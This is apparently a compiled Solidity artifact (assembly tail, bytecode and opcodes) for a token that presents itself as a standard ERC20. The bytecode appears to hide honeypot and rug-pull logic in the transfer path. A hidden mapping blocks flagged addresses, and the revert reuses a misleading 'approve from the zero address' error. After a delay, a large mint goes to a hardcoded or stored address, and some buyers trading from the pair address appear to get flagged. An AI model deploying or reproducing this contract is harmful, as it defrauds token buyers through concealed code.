tag_233\n        /* \"#utility.yul\":2486:2495   */\n      dup4\n        /* \"#utility.yul\":2467:2496   */\n      tag_208\n      jump\t// in\n    tag_233:\n        /* \"#utility.yul\":2457:2496   */\n      swap2\n      pop\n        /* \"#utility.yul\":2515:2553   */\n      tag_234\n        /* \"#utility.yul\":2549:2551   */\n      0x20\n        /* \"#utility.yul\":2538:2547   */\n      dup5\n        /* \"#utility.yul\":2534:2552   */\n      add\n        /* \"#utility.yul\":2515:2553   */\n      tag_208\n      jump\t// in\n    tag_234:\n        /* \"#utility.yul\":2505:2553   */\n      swap1\n      pop\n        /* \"#utility.yul\":2299:2559   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2790:3170   */\n    tag_102:\n        /* \"#utility.yul\":2869:2870   */\n      0x01\n        /* \"#utility.yul\":2865:2877   */\n      dup2\n      dup2\n      shr\n      swap1\n        /* \"#utility.yul\":2912:2924   */\n      dup3\n      and\n      dup1\n        /* \"#utility.yul\":2933:2994   */\n      tag_237\n      jumpi\n        /* \"#utility.yul\":2987:2991   */\n      0x7f\n        /* \"#utility.yul\":2979:2985   */\n      dup3\n        /* \"#utility.yul\":2975:2992   */\n      and\n        /* \"#utility.yul\":2965:2992   */\n      swap2\n      pop\n        /* \"#utility.yul\":2933:2994   */\n    tag_237:\n        /* \"#utility.yul\":3040:3042   */\n      0x20\n        /* \"#utility.yul\":3032:3038   */\n      dup3\n        /* \"#utility.yul\":3029:3043   */\n      lt\n        /* \"#utility.yul\":3009:3027   */\n      dup2\n        /* \"#utility.yul\":3006:3044   */\n      sub\n        /* \"#utility.yul\":3003:3164   */\n      tag_238\n      jumpi\n        /* \"#utility.yul\":3086:3096   */\n      0x4e487b71\n        /* \"#utility.yul\":3081:3084   */\n      0xe0\n        /* \"#utility.yul\":3077:3097   */\n      shl\n        /* \"#utility.yul\":3074:3075   */\n      0x00\n        /* \"#utility.yul\":3067:3098   */\n      mstore\n        /* \"#utility.yul\":3121:3125   */\n      0x22\n        /* \"#utility.yul\":3118:3119   */\n      0x04\n        /* \"#utility.yul\":3111:3126   */\n      mstore\n        /* \"#utility.yul\":3149:3153   */\n      0x24\n        /* \"#utility.yul\":3146:3147   */\n      0x00\n        /* \"#utility.yul\":3139:3154   */\n      revert\n        /* \"#utility.yul\":3003:3164   */\n    tag_238:\n      pop\n        /* \"#utility.yul\":2790:3170   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3175:3302   */\n    tag_209:\n        /* \"#utility.yul\":3236:3246   */\n      0x4e487b71\n        /* \"#utility.yul\":3231:3234   */\n      0xe0\n        /* \"#utility.yul\":3227:3247   */\n      shl\n        /* \"#utility.yul\":3224:3225   */\n      0x00\n        /* \"#utility.yul\":3217:3248   */\n      mstore\n        /* \"#utility.yul\":3267:3271   */\n      0x11\n        /* \"#utility.yul\":3264:3265   */\n      0x04\n        /* \"#utility.yul\":3257:3272   */\n      mstore\n        /* \"#utility.yul\":3291:3295   */\n      0x24\n        /* \"#utility.yul\":3288:3289   */\n      0x00\n        /* \"#utility.yul\":3281:3296   */\n      revert\n        /* \"#utility.yul\":3307:3432   */\n    tag_125:\n        /* \"#utility.yul\":3372:3381   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":3393:3403   */\n      dup1\n      dup3\n      gt\n        /* \"#utility.yul\":3390:3426   */\n      iszero\n      tag_107\n      jumpi\n        /* \"#utility.yul\":3406:3424   */\n      tag_107\n      tag_209\n      jump\t// in\n        /* \"#utility.yul\":3843:4243   */\n    tag_148:\n        /* \"#utility.yul\":4045:4047   */\n      0x20\n        /* \"#utility.yul\":4027:4048   */\n      dup1\n      dup3\n      mstore\n        /* \"#utility.yul\":4084:4086   */\n      0x24\n        /* \"#utility.yul\":4064:4082   */\n      swap1\n      dup3\n      add\n        /* \"#utility.yul\":4057:4087   */\n      mstore\n        /* \"#utility.yul\":4123:4157   */\n      0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464\n        /* \"#utility.yul\":4118:4120   */\n      0x40\n        /* \"#utility.yul\":4103:4121   */\n      dup3\n      add\n        /* \"#utility.yul\":4096:4158   */\n      mstore\n      shl(0xe0, 0x72657373)\n        /* \"#utility.yul\":4189:4191   */\n      0x60\n        /* \"#utility.yul\":4174:4192   */\n      dup3\n      add\n        /* \"#utility.yul\":4167:4201   */\n      mstore\n        /* \"#utility.yul\":4233:4236   */\n      0x80\n        /* \"#utility.yul\":4218:4237   */\n      add\n      swap1\n        /* \"#utility.yul\":3843:4243   */\n      jump\t// out\n        /* \"#utility.yul\":6226:6354   */\n    tag_182:\n        /* \"#utility.yul\":6293:6302   */\n      dup2\n      dup2\n      sub\n        /* \"#utility.yul\":6314:6325   */\n      dup2\n      dup2\n      gt\n        /* \"#utility.yul\":6311:6348   */\n      iszero\n      tag_107\n      jumpi\n        /* \"#utility.yul\":6328:6346   */\n      tag_107\n      tag_209\n      jump\t// in\n        /* \"#utility.yul\":6359:6527   */\n    tag_187:\n        /* \"#utility.yul\":6432:6441   */\n      dup1\n      dup3\n      mul\n        /* \"#utility.yul\":6463:6472   */\n      dup2\n      iszero\n        /* \"#utility.yul\":6480:6495   */\n      dup3\n      dup3\n      div\n        /* \"#utility.yul\":6474:6496   */\n      dup5\n      eq\n        /* \"#utility.yul\":6460:6497   */\n      or\n        /* \"#utility.yul\":6450:6521   */\n      tag_107\n      jumpi\n        /* \"#utility.yul\":6501:6519   */\n      tag_107\n      tag_209\n      jump\t// in\n        /* \"#utility.yul\":6532:6749   */\n    tag_196:\n        /* \"#utility.yul\":6572:6573   */\n      0x00\n        /* \"#utility.yul\":6598:6599   */\n      dup3\n        /* \"#utility.yul\":6588:6720   */\n      tag_257\n      jumpi\n        /* \"#utility.yul\":6642:6652   */\n      0x4e487b71\n        /* \"#utility.yul\":6637:6640   */\n      0xe0\n        /* \"#utility.yul\":6633:6653   */\n      shl\n        /* \"#utility.yul\":6630:6631   */\n      0x00\n        /* \"#utility.yul\":6623:6654   */\n      mstore\n        /* \"#utility.yul\":6677:6681   */\n      0x12\n        /* \"#utility.yul\":6674:6675   */\n      0x04\n        /* \"#utility.yul\":6667:6682   */\n      mstore\n        /* \"#utility.yul\":6705:6709   */\n      0x24\n        /* \"#utility.yul\":6702:6703   */\n      0x00\n        /* \"#utility.yul\":6695:6710   */\n      revert\n        /* \"#utility.yul\":6588:6720   */\n    tag_257:\n      pop\n        /* \"#utility.yul\":6734:6743   */\n      div\n      swap1\n        /* \"#utility.yul\":6532:6749   */\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c195d06938c389faa7120d4992e22077d7e2cd1372ff9171abcaa969288c51ae64736f6c63430008160033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052600780546001600160a01b03191673165c3410fc91ef562c50559f7d2289febed552d91790556009805460ff60a01b1916905562000040601290565b6200004d90600a620001c4565b6200005d90630134d680620001db565b600b553480156200006c575f80fd5b5060405162001045380380620010458339810160408190526200008f91620002b6565b60056200009d8382620003a6565b506006620000ac8282620003a6565b50505062000472565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156200010957815f1904821115620000ed57620000ed620000b5565b80851615620000fb57918102915b93841c9390800290620000ce565b509250929050565b5f826200012157506001620001be565b816200012f57505f620001be565b8160018114620001485760028114620001535762000173565b6001915050620001be565b60ff841115620001675762000167620000b5565b50506001821b620001be565b5060208310610133831016604e8410600b841016171562000198575081810a620001be565b620001a48383620000c9565b805f1904821115620001ba57620001ba620000b5565b0290505b92915050565b5f620001d460ff84168362000111565b9392505050565b8082028115828204841417620001be57620001be620000b5565b634e487b7160e01b5f52604160045260245ffd5b5f82601f83011262000219575f80fd5b81516001600160401b0380821115620002365762000236620001f5565b604051601f8301601f19908116603f01168101908282118183101715620002615762000261620001f5565b81604052838152602092508660208588010111156200027e575f80fd5b5f91505b83821015620002a1578582018301518183018401529082019062000282565b5f602085830101528094505050505092915050565b5f8060408385031215620002c8575f80fd5b82516001600160401b0380821115620002df575f80fd5b620002ed8683870162000209565b9350602085015191508082111562000303575f80fd5b50620003128582860162000209565b9150509250929050565b600181811c908216806200033157607f821691505b6020821081036200035057634e487b7160e01b5f52602260045260245ffd5b50919050565b601f821115620003a157805f5260205f20601f840160051c810160208510156200037d5750805b601f840160051c820191505b818110156200039e575f815560010162000389565b50505b505050565b81516001600160401b03811115620003c257620003c2620001f5565b620003da81620003d384546200031c565b8462000356565b602080601f83116001811462000410575f8415620003f85750858301515b5f19600386901b1c1916600185901b1785556200046a565b5f85815260208120601f198616915b8281101562000440578886015182559484019460019091019084016200041f565b50858210156200045e57878501515f19600388901b60f8161c191681555b505060018460011b0185555b505050505050565b610bc580620004805f395ff3fe608060405234801561000f575f80fd5b506004361061010d575f3560e01c806370a08231116100a9578063d96661ef1161006e578063d96661ef1461024d578063dd62ed3e14610278578063e0bb30791461028b578063eba9481d1461029e578063f887ea40146102a7575f80fd5b806370a08231146101ee57806395d89b4114610216578063a457c2d71461021e578063a9059cbb14610231578063d8da856014610244575f80fd5b806306fdde0314610111578063095ea7b31461012f57806309bd5a601461015257806318160ddd1461016657806323b872dd14610178578063313ce5671461018b578063395093511461019a5780634f9105d3146101ad5780636ebcf607146101cf575b5f80fd5b6101196102b9565b604051610126919061098a565b60405180910390f35b61014261013d3660046109f1565b610349565b6040519015158152602001610126565b60095461014290600160a01b900460ff1681565b6004545b604051908152602001610126565b610142610186366004610a19565b610362565b60405160128152602001610126565b6101426101a83660046109f1565b610385565b6101426101bb366004610a52565b60086020525f908152604090205460ff1681565b61016a6101dd366004610a52565b60026020525f908152604090205481565b61016a6101fc366004610a52565b6001600160a01b03165f9081526002602052604090205490565b6101196103a6565b61014261022c3660046109f1565b6103b5565b61014261023f3660046109f1565b610434565b61016a600b5481565b600954610260906001600160a01b031681565b6040516001600160a01b039091168152602001610126565b61016a610286366004610a72565b610441565b600154610260906001600160a01b031681565b61016a600a5481565b5f54610260906001600160a01b031681565b6060600580546102c890610aa3565b80601f01602080910402602001604051908101604052809291908181526020018280546102f490610aa3565b801561033f5780601f106103165761010080835404028352916020019161033f565b820191905f5260205f20905b81548152906001019060200180831161032257829003601f168201915b5050505050905090565b5f3361035681858561046b565b60019150505b92915050565b5f3361036f858285610552565b61037a8585856105ca565b506001949350505050565b5f336103568185856103978383610441565b6103a19190610aef565b61046b565b6060600680546102c890610aa3565b5f33816103c28286610441565b9050838110156104275760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b60648201526084015b60405180910390fd5b61037a828686840361046b565b5f336103568185856105ca565b6001600160a01b039182165f90815260036020908152604080832093909416825291909152205490565b6001600160a01b0383166104915760405162461bcd60e51b815260040161041e90610b02565b6001600160a01b0382166104f25760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b606482015260840161041e565b6001600160a01b038381165f8181526003602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b5f61055d8484610441565b90505f1981146105c457818110156105b75760405162461bcd60e51b815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000604482015260640161041e565b6105c4848484840361046b565b50505050565b6001600160a01b03831661062e5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b606482015260840161041e565b6001600160a01b0382166106905760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b606482015260840161041e565b6001600160a01b0383165f908152600260205260409020546106b3848484610783565b818110156107125760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b606482015260840161041e565b6001600160a01b038085165f8181526002602052604080822086860390559286168082529083902080548601905591517fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906107719086815260200190565b60405180910390a36105c4565b505050565b6001600160a01b0383165f9081526008602052604090205460ff16156107bb5760405162461bcd60e51b815260040161041e90610b02565b610708600a54426107cc9190610b46565b111561080857600954600160a01b900460ff1661080857600954600b54610808916001600160a01b031690610803906103e8610b59565b6108cb565b6001546001600160a01b03838116911614801561083357506009546001600160a01b03848116911614155b801561084d57506009546001600160a01b03838116911614155b1561077e57610384600a54426108639190610b46565b111561077e576103e8600b54600161087b9190610b59565b6108859190610b70565b8111156108a45760405162461bcd60e51b815260040161041e90610b02565b6001600160a01b0383165f908152600860205260409020805460ff19166001179055505050565b6001600160a01b0382166109215760405162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015260640161041e565b8060045f8282546109329190610aef565b90915550506001600160a01b0382165f818152600260209081526040808320805486019055518481527fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef910160405180910390a35050565b5f602080835283518060208501525f5b818110156109b65785810183015185820160400152820161099a565b505f604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b03811681146109ec575f80fd5b919050565b5f8060408385031215610a02575f80fd5b610a0b836109d6565b946020939093013593505050565b5f805f60608486031215610a2b575f80fd5b610a34846109d6565b9250610a42602085016109d6565b9150604084013590509250925092565b5f60208284031215610a62575f80fd5b610a6b826109d6565b9392505050565b5f8060408385031215610a83575f80fd5b610a8c836109d6565b9150610a9a602084016109d6565b90509250929050565b600181811c90821680610ab757607f821691505b602082108103610ad557634e487b7160e01b5f52602260045260245ffd5b50919050565b634e487b7160e01b5f52601160045260245ffd5b8082018082111561035c5761035c610adb565b60208082526024908201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646040820152637265737360e01b606082015260800190565b8181038181111561035c5761035c610adb565b808202811582820484141761035c5761035c610adb565b5f82610b8a57634e487b7160e01b5f52601260045260245ffd5b50049056fea2646970667358221220c195d06938c389faa7120d4992e22077d7e2cd1372ff9171abcaa969288c51ae64736f6c63430008160033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x7 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x165C3410FC91EF562C50559F7D2289FEBED552D9 OR SWAP1 SSTORE PUSH1 0x9 DUP1 SLOAD PUSH1 0xFF PUSH1 0xA0 SHL NOT AND SWAP1 SSTORE PUSH3 0x40 PUSH1 0x12 SWAP1 JUMP JUMPDEST PUSH3 0x4D SWAP1 PUSH1 0xA PUSH3 0x1C4 JUMP JUMPDEST PUSH3 0x5D SWAP1 PUSH4 0x134D680 PUSH3 0x1DB JUMP JUMPDEST PUSH1 0xB SSTORE CALLVALUE DUP1 ISZERO PUSH3 0x6C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1045 CODESIZE SUB DUP1 PUSH3 0x1045 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH3 0x8F SWAP2 PUSH3 0x2B6 JUMP JUMPDEST PUSH1 0x5 PUSH3 0x9D DUP4 DUP3 PUSH3 0x3A6 JUMP JUMPDEST POP PUSH1 0x6 PUSH3 0xAC DUP3 DUP3 PUSH3 0x3A6 JUMP JUMPDEST POP POP POP PUSH3 0x472 JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH1 0x1 DUP2 DUP2 JUMPDEST DUP1 DUP6 GT ISZERO PUSH3 0x109 JUMPI DUP2 PUSH0 NOT DIV DUP3 GT ISZERO PUSH3 0xED JUMPI PUSH3 0xED PUSH3 0xB5 JUMP JUMPDEST DUP1 DUP6 AND ISZERO PUSH3 0xFB JUMPI SWAP2 DUP2 MUL SWAP2 JUMPDEST SWAP4 DUP5 SHR SWAP4 SWAP1 DUP1 MUL SWAP1 PUSH3 0xCE JUMP JUMPDEST POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 PUSH3 0x121 JUMPI POP PUSH1 0x1 PUSH3 0x1BE JUMP JUMPDEST DUP2 PUSH3 0x12F JUMPI POP PUSH0 PUSH3 0x1BE JUMP JUMPDEST DUP2 PUSH1 0x1 DUP2 EQ PUSH3 0x148 JUMPI PUSH1 0x2 DUP2 EQ PUSH3 0x153 JUMPI PUSH3 0x173 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP PUSH3 0x1BE JUMP JUMPDEST PUSH1 0xFF DUP5 GT ISZERO PUSH3 0x167 JUMPI PUSH3 0x167 PUSH3 0xB5 JUMP JUMPDEST POP POP PUSH1 0x1 DUP3 SHL PUSH3 0x1BE JUMP JUMPDEST POP PUSH1 0x20 DUP4 LT PUSH2 0x133 DUP4 LT AND PUSH1 0x4E DUP5 LT PUSH1 0xB DUP5 LT AND OR ISZERO PUSH3 0x198 JUMPI POP DUP2 DUP2 EXP PUSH3 0x1BE JUMP JUMPDEST PUSH3 0x1A4 DUP4 DUP4 PUSH3 0xC9 JUMP JUMPDEST DUP1 PUSH0 NOT DIV DUP3 GT ISZERO PUSH3 0x1BA JUMPI PUSH3 0x1BA PUSH3 0xB5 JUMP JUMPDEST MUL SWAP1 POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH3 0x1D4 PUSH1 0xFF DUP5 AND DUP4 PUSH3 0x111 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 MUL DUP2 ISZERO DUP3 DUP3 DIV DUP5 EQ OR PUSH3 0x1BE JUMPI PUSH3 0x1BE PUSH3 0xB5 JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH3 0x219 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP1 DUP3 GT ISZERO PUSH3 0x236 JUMPI PUSH3 0x236 PUSH3 0x1F5 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1F DUP4 ADD PUSH1 0x1F NOT SWAP1 DUP2 AND PUSH1 0x3F ADD AND DUP2 ADD SWAP1 DUP3 DUP3 GT DUP2 DUP4 LT OR ISZERO PUSH3 0x261 JUMPI PUSH3 0x261 PUSH3 0x1F5 JUMP JUMPDEST DUP2 PUSH1 0x40 MSTORE DUP4 DUP2 MSTORE PUSH1 0x20 SWAP3 POP DUP7 PUSH1 0x20 DUP6 DUP9 ADD ADD GT ISZERO PUSH3 0x27E JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP4 DUP3 LT ISZERO PUSH3 0x2A1 JUMPI DUP6 DUP3 ADD DUP4 ADD MLOAD DUP2 DUP4 ADD DUP5 ADD MSTORE SWAP1 DUP3 ADD SWAP1 PUSH3 0x282 JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP6 DUP4 ADD ADD MSTORE DUP1 SWAP5 POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH3 0x2C8 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP3 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP1 DUP3 GT ISZERO PUSH3 0x2DF JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH3 0x2ED DUP7 DUP4 DUP8 ADD PUSH3 0x209 JUMP JUMPDEST SWAP4 POP PUSH1 0x20 DUP6 ADD MLOAD SWAP2 POP DUP1 DUP3 GT ISZERO PUSH3 0x303 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH3 0x312 DUP6 DUP3 DUP7 ADD PUSH3 0x209 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH3 0x331 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH3 0x350 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH3 0x3A1 JUMPI DUP1 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 PUSH1 0x1F DUP5 ADD PUSH1 0x5 SHR DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH3 0x37D JUMPI POP DUP1 JUMPDEST PUSH1 0x1F DUP5 ADD PUSH1 0x5 SHR DUP3 ADD SWAP2 POP JUMPDEST DUP2 DUP2 LT ISZERO PUSH3 0x39E JUMPI PUSH0 DUP2 SSTORE PUSH1 0x1 ADD PUSH3 0x389 JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP2 GT ISZERO PUSH3 0x3C2 JUMPI PUSH3 0x3C2 PUSH3 0x1F5 JUMP JUMPDEST PUSH3 0x3DA DUP2 PUSH3 0x3D3 DUP5 SLOAD PUSH3 0x31C JUMP JUMPDEST DUP5 PUSH3 0x356 JUMP JUMPDEST PUSH1 0x20 DUP1 PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH3 0x410 JUMPI PUSH0 DUP5 ISZERO PUSH3 0x3F8 JUMPI POP DUP6 DUP4 ADD MLOAD JUMPDEST PUSH0 NOT PUSH1 0x3 DUP7 SWAP1 SHL SHR NOT AND PUSH1 0x1 DUP6 SWAP1 SHL OR DUP6 SSTORE PUSH3 0x46A JUMP JUMPDEST PUSH0 DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 KECCAK256 PUSH1 0x1F NOT DUP7 AND SWAP2 JUMPDEST DUP3 DUP2 LT ISZERO PUSH3 0x440 JUMPI DUP9 DUP7 ADD MLOAD DUP3 SSTORE SWAP5 DUP5 ADD SWAP5 PUSH1 0x1 SWAP1 SWAP2 ADD SWAP1 DUP5 ADD PUSH3 0x41F JUMP JUMPDEST POP DUP6 DUP3 LT ISZERO PUSH3 0x45E JUMPI DUP8 DUP6 ADD MLOAD PUSH0 NOT PUSH1 0x3 DUP9 SWAP1 SHL PUSH1 0xF8 AND SHR NOT AND DUP2 SSTORE JUMPDEST POP POP PUSH1 0x1 DUP5 PUSH1 0x1 SHL ADD DUP6 SSTORE JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH2 0xBC5 DUP1 PUSH3 0x480 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x10D JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0xA9 JUMPI DUP1 PUSH4 0xD96661EF GT PUSH2 0x6E JUMPI DUP1 PUSH4 0xD96661EF EQ PUSH2 0x24D JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x278 JUMPI DUP1 PUSH4 0xE0BB3079 EQ PUSH2 0x28B JUMPI DUP1 PUSH4 0xEBA9481D EQ PUSH2 0x29E JUMPI DUP1 PUSH4 0xF887EA40 EQ PUSH2 0x2A7 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x1EE JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x216 JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x21E JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x231 JUMPI DUP1 PUSH4 0xD8DA8560 EQ PUSH2 0x244 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x111 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x12F JUMPI DUP1 PUSH4 0x9BD5A60 EQ PUSH2 0x152 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x166 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x178 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x18B JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x19A JUMPI DUP1 PUSH4 0x4F9105D3 EQ PUSH2 0x1AD JUMPI DUP1 PUSH4 0x6EBCF607 EQ PUSH2 0x1CF JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x119 PUSH2 0x2B9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x126 SWAP2 SWAP1 PUSH2 0x98A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x142 PUSH2 0x13D CALLDATASIZE PUSH1 0x4 PUSH2 0x9F1 JUMP JUMPDEST PUSH2 0x349 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x126 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH2 0x142 SWAP1 PUSH1 0x1 PUSH1 0xA0 SHL SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x126 JUMP JUMPDEST PUSH2 0x142 PUSH2 0x186 CALLDATASIZE PUSH1 0x4 PUSH2 0xA19 JUMP JUMPDEST PUSH2 0x362 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x126 JUMP JUMPDEST PUSH2 0x142 PUSH2 0x1A8 CALLDATASIZE PUSH1 0x4 PUSH2 0x9F1 JUMP JUMPDEST PUSH2 0x385 JUMP JUMPDEST PUSH2 0x142 PUSH2 0x1BB CALLDATASIZE PUSH1 0x4 PUSH2 0xA52 JUMP JUMPDEST PUSH1 0x8 PUSH1 0x20 MSTORE PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH2 0x16A PUSH2 0x1DD CALLDATASIZE PUSH1 0x4 PUSH2 0xA52 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 MSTORE PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH2 0x16A PUSH2 0x1FC CALLDATASIZE PUSH1 0x4 PUSH2 0xA52 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0x119 PUSH2 0x3A6 JUMP JUMPDEST PUSH2 0x142 PUSH2 0x22C CALLDATASIZE PUSH1 0x4 PUSH2 0x9F1 JUMP JUMPDEST PUSH2 0x3B5 JUMP JUMPDEST PUSH2 0x142 PUSH2 0x23F CALLDATASIZE PUSH1 0x4 PUSH2 0x9F1 JUMP JUMPDEST PUSH2 0x434 JUMP JUMPDEST PUSH2 0x16A PUSH1 0xB SLOAD DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH2 0x260 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x126 JUMP JUMPDEST PUSH2 0x16A PUSH2 0x286 CALLDATASIZE PUSH1 0x4 PUSH2 0xA72 JUMP JUMPDEST PUSH2 0x441 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH2 0x260 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH2 0x16A PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH0 SLOAD PUSH2 0x260 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x5 DUP1 SLOAD PUSH2 0x2C8 SWAP1 PUSH2 0xAA3 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x2F4 SWAP1 PUSH2 0xAA3 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x33F JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x316 JUMPI PUSH2 0x100 DUP1 DUP4 